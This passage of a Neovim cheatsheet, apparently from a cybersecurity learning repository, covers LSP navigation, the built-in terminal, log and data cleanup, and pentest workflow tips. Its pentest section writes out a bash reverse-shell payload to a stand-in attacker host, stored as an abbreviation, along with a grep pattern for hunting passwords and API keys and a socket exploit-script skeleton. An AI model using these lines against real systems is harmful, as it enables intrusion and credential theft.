require("lspconfig").pyright.setup({})
require("lspconfig").lua_ls.setup({})
require("lspconfig").bashls.setup({})
```

```vim
" ── LSP NAVIGATION (works once a server is attached to buffer) ─────
gd            " go to definition
gD            " go to declaration
gr            " find all references
gi            " go to implementation
gt            " go to type definition
K             " show hover documentation (great for quick lookups)
<C-k>         " show function signature help (while in insert mode)

" ── DIAGNOSTICS (errors, warnings, hints) ─────────────────────────
]d            " jump to next diagnostic
[d            " jump to previous diagnostic
<leader>e     " show diagnostic in floating window
<leader>q     " send all diagnostics to quickfix list
:lua vim.diagnostic.open_float()   " manually show diagnostic popup

" ── CODE ACTIONS & REFACTORING ────────────────────────────────────
<leader>ca    " show available code actions (quick fixes, imports, etc.)
<leader>rn    " rename symbol across entire project (LSP-aware!)
gq            " format selected text (using formatprg or LSP formatter)
<leader>f     " format entire buffer (common custom mapping)

" ── WORKSPACE SYMBOLS ─────────────────────────────────────────────
:lua vim.lsp.buf.workspace_symbol()   " search symbols across whole project
:lua vim.lsp.buf.document_symbol()    " search symbols in current file

" ── AUTOCOMPLETE (nvim-cmp) ────────────────────────────────────────
Ctrl+Space    " manually trigger completion menu
Ctrl+n / Ctrl+p   " navigate completion items (next/previous)
Tab / S-Tab    " navigate completion (if configured)
Enter / Ctrl+y " confirm selected completion
Ctrl+e         " close completion menu without selecting

" ── INLAY HINTS (Neovim 0.10+) ────────────────────────────────────
:lua vim.lsp.inlay_hint.enable(true)   " show inline type hints
```

| LSP Action | Key | Function |
|-----------|-----|----------|
| Go to definition | `gd` | Jump to definition |
| Find references | `gr` | Find all references |
| Hover docs | `K` | Show documentation |
| Rename symbol | `<leader>rn` | Rename across project |
| Code action | `<leader>ca` | Code fix suggestions |
| Next diagnostic | `]d` | Jump to next error |

---

## 13. Terminal & Shell Integration

Neovim has a built-in terminal emulator, letting you run a shell without leaving the editor, which is extremely useful during pentesting or scripting when you need to run tools while editing payloads or notes.

```vim
" ── OPENING A TERMINAL ────────────────────────────────────────────
:terminal             " open terminal in current window
:term                 " shorthand
:vsplit term://bash   " open terminal in vertical split
:split | terminal     " open terminal in horizontal split
:tabnew | terminal    " open terminal in new tab

" ── TERMINAL MODE NAVIGATION ──────────────────────────────────────
i              " (from normal mode in terminal buffer) enter terminal/insert mode
Ctrl+\ Ctrl+n  " exit terminal mode → back to normal mode (KEY combo to remember!)
Ctrl+w h/j/k/l " navigate to other windows while terminal mode is active... 
               " (note: works after Ctrl+\ Ctrl+n in some configs, or directly)

" ── COMMON CUSTOM TERMINAL MAPPINGS (add to init.lua) ──────────────
" map("t", "<Esc>", "<C-\\><C-n>", { desc = "Esc to exit terminal mode" })
" map("t", "<C-h>", "<C-\\><C-n><C-w>h")
" map("t", "<C-j>", "<C-\\><C-n><C-w>j")
" map("t", "<C-k>", "<C-\\><C-n><C-w>k")
" map("t", "<C-l>", "<C-\\><C-n><C-w>l")

" ── RUNNING SHELL COMMANDS WITHOUT OPENING A TERMINAL ───────────────
:!ls -la                    " run shell command, show output, return to nvim
:r !date                     " insert OUTPUT of shell command into buffer
:r !curl -s https://api.example.com/data    " insert API response into buffer
:%!sort                       " pipe ENTIRE buffer through external `sort` command
:%!python3 -m json.tool        " pretty-print JSON in current buffer
:'<,'>!sort -n                 " pipe VISUAL SELECTION through sort -n

" ── EXECUTE CURRENT FILE ──────────────────────────────────────────
:!python3 %                   " run current file with python3 (% = current filename)
:!bash %                      " run current file as a bash script
:!chmod +x % && ./%           " make executable and run

" Custom keymap for "run current file" (add to init.lua):
" map("n", "<leader>r", ":!python3 %<CR>", { desc = "Run current Python file" })

" ── ASYNC JOBS (no blocking, e.g., for nmap scans) ────────────────
" Using a plugin like toggleterm.nvim or vim-dispatch:
:AsyncRun nmap -p- target.com    " run scan in background, show output incrementally

" ── PRACTICAL TIP: edit + run loop ─────────────────────────────────
" 1. Edit script in normal nvim buffer
" 2. :w to save
" 3. :split | terminal  to open a terminal pane
" 4. Run script in terminal pane, see output
" 5. Ctrl+w k to go back to editor, edit, :w, repeat
```

| Command | Function |
|---------|----------|
| `:terminal` | Open terminal in nvim |
| `Ctrl+\ Ctrl+n` | Exit terminal mode |
| `:r !cmd` | Insert command output |
| `:%!sort` | Pipe entire buffer |
| `:!python3 %` | Run current file |

---

## 14. Security Note — Neovim for Pentest & CTF

Neovim is often the only editor available after gaining shell access to a target server. Knowing these quick tricks lets you edit, analyze, and automate directly from within an SSH or reverse shell session without file transfers.

```vim
" ── QUICK CONFIG-LESS EDITING (no plugins, vanilla vim/nvim) ──────
" Even on a stripped-down system, these always work:
vim file.conf
:set number              " turn on line numbers temporarily
:set paste                " disable auto-indent when pasting (avoid mangled code)
:set nopaste               " turn paste mode back off after pasting

" ── ANALYZING LOG FILES DURING INCIDENT RESPONSE ────────────────────
:g/Failed password/d          " delete all non-matching... wait, use :v instead
:v/Failed password/d           " KEEP only lines with "Failed password", delete rest
:g/203\.0\.113\.5/normal A <-- SUSPICIOUS    " annotate lines matching an IP
:%s/\d\{1,3}\.\d\{1,3}\.\d\{1,3}\.\d\{1,3}/[IP]/g   " redact IPs (basic pattern)

" ── EXTRACTING DATA FROM TOOL OUTPUT ──────────────────────────────
:%!awk '{print $1}'             " filter buffer down to first column
:%!grep -E '^[0-9]'              " keep only lines starting with digit
:'<,'>!sort -u                    " dedupe a selected list of hosts/IPs

" ── QUICK BASE64 / HEX DECODE (pipe through external tools) ───────
:%!base64 -d                     " decode entire buffer from base64
:%!xxd                           " hex dump entire buffer
:%!xxd -r                        " reverse a hex dump back to binary

" ── EDITING REMOTE FILES VIA SSH (netrw, no extra tools needed!) ──
vim scp://user@target.com//etc/passwd      " edit remote file directly over SSH
vim scp://user@target.com:2222//var/log/auth.log   " custom port

" ── DIFFING TWO FILES (e.g., compare configs before/after) ────────
vim -d file1.conf file2.conf      " open in diff mode
nvim -d file1.conf file2.conf     " same with nvim
]c / [c                            " jump to next/previous diff hunk
do                                  " diff obtain (pull change from other file)
dp                                  " diff put (push change to other file)

" ── EDITING BINARY FILES ────────────────────────────────────────────
vim -b file.bin           " open in binary mode (preserves exact bytes)
:%!xxd                     " convert to hex view for editing
:%!xxd -r                  " convert back to binary before saving

" ── QUICK PAYLOAD/SCRIPT TEMPLATES (using abbreviations) ──────────
:iabbrev revshell bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
" Now typing "revshell<Space>" auto-expands to the full payload

" ── SEARCH FOR SECRETS/CREDENTIALS IN A CODEBASE ──────────────────
:vimgrep /password\|secret\|api_key/gj **/*.{py,js,env,yml}
:copen                      " open quickfix window to browse all matches
:cn / :cp                   " navigate to next/previous match

" ── PERSISTENT NOTES DURING AN ENGAGEMENT ──────────────────────────
" Keep a running notes.md open in a vertical split while you work:
:vsp notes.md
" Use marks (mN) to bookmark important findings for quick `N jumping
```

### Neovim Pentest Quick Reference

| Use Case | Command | Notes |
|----------|---------|-------|
| Edit remote file via SSH | `vim scp://user@host//path` | No file transfer needed |
| Decode base64 buffer | `:%!base64 -d` | Pipe through external tool |
| Keep only matching lines | `:v/pattern/d` | Inverse of `:g//d` |
| Diff two configs | `vim -d f1 f2` | Built-in diff mode |
| Redact IPs in logs | `:%s/regex/[IP]/g` | Sanitize for reports |
| Quick payload snippet | `:iabbrev` | Auto-expand text |

---

## 15. Practical Workflow — Real-World Examples

```vim
" ── SCENARIO 1: Clean up and analyze a scan output file ──────────────

" Open the nmap output
:e nmap_scan.txt

" Keep only lines showing open ports
:v/open/d

" Extract just the port numbers into a new register for reuse
:%s/^\(\d\+\)\/tcp.*/\1/g
:%y a

" ── SCENARIO 2: Bulk-rename variables across a project (refactor) ────

" Find all occurrences first
:vimgrep /old_function_name/gj **/*.py
:copen

" Apply rename to every match found
:cdo %s/old_function_name/new_function_name/g | update

" ── SCENARIO 3: Quickly template a Python exploit script ──────────────

:e exploit.py
" Use abbreviation or snippet to insert template:
iimport socket<CR>import sys<CR><CR>def exploit(target, port):<CR>
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<CR>
    s.connect((target, port))<Esc>

" ── SCENARIO 4: Compare two versions of a config file ──────────────────

vim -d /etc/nginx/nginx.conf.bak /etc/nginx/nginx.conf
" Review each diff hunk:
]c           " next difference
do           " pull change from other file if it looks correct
:wqa         " save both and quit

" ── SCENARIO 5: Macro to convert raw IP list into nmap target syntax ──

" Input (one IP per line):
" 10.0.0.1
" 10.0.0.2
" 10.0.0.3

" Record macro to join all lines with a comma:
qaJxi,<Esc>q       " (rough idea — joins line, removes trailing char, adds comma)
" Better approach using a one-liner instead:
:%s/\n/,/g          " replace ALL newlines with commas (whole buffer)

" ── SCENARIO 6: Live-tail a log inside Neovim ───────────────────────────

:vsp term://tail -f /var/log/auth.log
" Leave this terminal pane open in a split while editing notes alongside it

" ── SCENARIO 7: Format and validate a captured JSON response ───────────

:e response.json
:%!python3 -m json.tool      " pretty-print the JSON
" If invalid JSON, this will show an error — useful validation check
```

---

## Quick Reference Cheatsheet

```vim
" ── MODES ──────────────────────────────────────────────────────────
i a o / I A O    → insert variants
v V Ctrl+v        → visual / visual-line / visual-block
Esc / Ctrl+[       → back to normal mode

" ── MOVEMENT ───────────────────────────────────────────────────────
h j k l            → left/down/up/right
w b e               → word forward/back/end
0 ^ $               → line start / first non-blank / line end
gg G                → file start / file end
f<c> t<c> ; ,        → find char forward/until, repeat/reverse
Ctrl+d/u             → half-page down/up
%                    → matching bracket

" ── EDITING ────────────────────────────────────────────────────────
d / c / y + motion    → delete / change / yank
diw ciw yiw            → inner word variants
di" ci" da( ca(         → text objects (quotes, parens)
dd yy cc                → whole-line variants
p P                      → paste after / before
u Ctrl+r                 → undo / redo
.                         → repeat last change

" ── SEARCH & REPLACE ──────────────────────────────────────────────
/pattern  n N           → search forward, next, prev
:%s/old/new/g            → replace all in file
:%s/old/new/gc            → replace all with confirm
:'<,'>s/old/new/g          → replace in visual selection
:g/pattern/d                → delete matching lines
:v/pattern/d                 → delete NON-matching lines

" ── REGISTERS & MACROS ────────────────────────────────────────────
"ayy "ap                 → yank/paste to/from register a
"+y "+p                   → system clipboard
qa ... q                  → record macro into 'a'
@a  @@  5@a                → replay macro / repeat / replay 5x

" ── WINDOWS, BUFFERS, TABS ─────────────────────────────────────────
:sp :vsp                  → horizontal/vertical split
Ctrl+w h/j/k/l              → move between windows
:bn :bp Ctrl+^                → next/prev/last buffer
gt gT                          → next/prev tab

" ── MARKS & FOLDS ──────────────────────────────────────────────────
ma `a 'a                  → set mark / jump exact / jump line
za zR zM                   → toggle/open-all/close-all folds

" ── LSP (with plugins) ────────────────────────────────────────────
gd gr K                    → definition, references, hover docs
<leader>rn <leader>ca        → rename, code action
]d [d                         → next/prev diagnostic

" ── TERMINAL ────────────────────────────────────────────────────────
:terminal                  → open terminal
Ctrl+\ Ctrl+n                → exit terminal mode
:r !cmd                       → insert command output
:%!cmd                         → pipe buffer through external command

" ── SAVE & QUIT ────────────────────────────────────────────────────
:w     → save
:q     → quit
:wq / :x → save and quit
:q!    → quit without saving
:wqa   → save and quit ALL windows
:wa    → save all open buffers
```

---

## Complete Command Reference Table

| Category | Command | Function |
|----------|---------|----------|
| Mode | `i` / `Esc` | Enter/exit insert |
| Movement | `w` / `b` | Jump word |
| Movement | `gg` / `G` | File start/end |
| Editing | `dd` / `yy` | Delete/yank line |
| Editing | `ciw` | Change inner word |
| Editing | `.` | Repeat change |
| Search | `:%s/a/b/g` | Replace all |
| Registers | `qa...q` / `@a` | Record/replay macro |
| Windows | `Ctrl+w h/j/k/l` | Navigate windows |
| Buffers | `:bn` / `:bp` | Next/prev buffer |
| LSP | `gd` / `K` | Definition/docs |
| Terminal | `:terminal` | Open terminal |

---

> References:
> - [Neovim Official Documentation](https://neovim.io/doc/)
> - [`:help` — built-in help, always up to date with your version](command:help)
> - [LazyVim — modern Neovim distribution](https://www.lazyvim.org)
> - [NvChad — another popular distribution](https://nvchad.com)
> - [Learn Vimscript the Hard Way](https://learnvimscriptthehardway.stevelosh.com)
> - [Vim Adventures — interactive learning game](https://vim-adventures.com)
> - [PayloadsAllTheThings — Linux/Vim escapes & tricks](https://github.com/swisskyrepo/PayloadsAllTheThings)

> Repository: [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)
> Feedback and contributions welcome. Open an issue or PR if you spot any errors.
